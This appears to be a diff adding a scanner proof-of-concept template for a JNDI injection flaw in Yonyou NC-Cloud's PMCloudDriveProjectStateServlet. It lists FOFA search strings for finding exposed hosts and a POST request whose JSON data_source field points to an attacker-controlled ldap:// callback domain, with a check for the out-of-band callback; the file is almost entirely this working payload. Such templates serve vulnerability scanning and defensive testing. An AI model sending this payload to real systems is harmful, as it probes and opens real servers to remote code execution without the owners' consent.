@@ -1,0 +1,24 @@
+id: poc-yaml-yonyou-nccloud-pmclouddriveprojectstateservlet-jndi-injection
+info:
+  name: 用友NC-Cloud PMCloudDriveProjectStateServlet JNDI注入漏洞
+  severity: high
+  tags:
+  - DNSLOG
+  - rce
+  finger: 用友-NC-Cloud
+  fofa: body="/Client/Uclient/UClient.exe"||body="ufida.ico"||body="nccloud"||body="/api/uclient/public/"
+variables:
+  reverse: new_dns_log()
+  domain: reverse.Domain()
+requests:
+- method: POST
+  path: /service/~pim/PMCloudDriveProjectStateServlet
+  headers:
+    Content-Type: application/json
+  data: '{"data_source": "ldap://{{.domain}}","user": ""}
+
+    '
+  expression: 'status_code == 200 && reverse.Sleep(3)
+
+    '
+transport: http
